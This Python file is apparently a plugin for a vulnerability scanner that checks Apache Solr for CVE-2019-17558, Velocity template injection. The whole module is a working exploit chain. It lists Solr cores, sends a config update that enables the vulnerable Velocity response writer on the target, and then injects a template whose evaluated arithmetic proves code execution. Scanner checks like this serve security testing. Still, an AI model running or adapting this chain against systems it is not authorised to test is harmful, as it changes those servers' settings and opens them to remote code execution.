#!/usr/bin/env python3
# @Time    : 2020-05-03
# @Author  : caicai
# @File    : poc_solr-velocity-template-rce_2019.py

'''
you can look:https://github.com/Imanfeng/Apache-Solr-RCE
'''
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.common import get_random_num
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "solr-velocity-template-rce"
        self.vulmsg = "CVE-2019-17558 ,referer:https://cert.360.cn/warning/detail?id=fba518d5fc5c4ed4ebedff1dab24caf2"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "GET",
            "url": self.url + "solr/admin/cores?wt=json",
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r != None and r.status_code == 200 and b"responseHeader" in r.content:
            name = re.search('"name":"(.*?)"', r.text)
            if name:
                name = name.group(1)

                req["method"] = "POST"
                req["headers"] = {
                    "Content-Type": "application/json"
                }
                req["data"] = '''{
        "update-queryresponsewriter": {
          "startup": "test",
          "name": "velocity",
          "class": "solr.VelocityResponseWriter",
          "template.base.dir": "",
          "solr.resource.loader.enabled": "true",
          "params.resource.loader.enabled": "true"
        }
      }'''
                req["url"] = self.url + "solr/{name}/config".format(name=name)
                r1 = request(**req)
                if r1 != None and r1.status_code == 200:
                    random_1 = get_random_num(4)
                    random_2 = get_random_num(4)
                    req1 = {
                        "method": "GET",
                        "url": self.url + "solr/{name}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{r1}%20*%20{r2})%24c".format(
                            name=name, r1=random_1, r2=random_2),
                        "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
                        "timeout": 10,
                        "allow_redirects": "False",
                        "verify": False,
                    }
                    r2 = request(**req1)
                    if r2 != None and r2.status_code == 200 and str(random_2 * random_1).encode() in r2.content:
                        parser_ = response_parser(r2)
                        self.result.append({
                            "name": self.name,
                            "url": self.url,
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request": parser_.getrequestraw(),
                                "response": parser_.getresponseraw()
                            }

                        })
